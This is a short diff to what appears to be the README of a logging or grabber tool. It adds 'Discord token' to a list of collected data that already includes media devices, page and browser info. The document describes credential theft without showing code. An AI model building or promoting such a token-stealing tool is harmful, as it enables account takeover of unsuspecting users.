@@ -16,6 +16,7 @@ It logs the following
 - Media Devices
 - Page Info
 - Browser Info
+- Discord token (If triggered in discord)
   
 ## Installation
 - Install required libraries
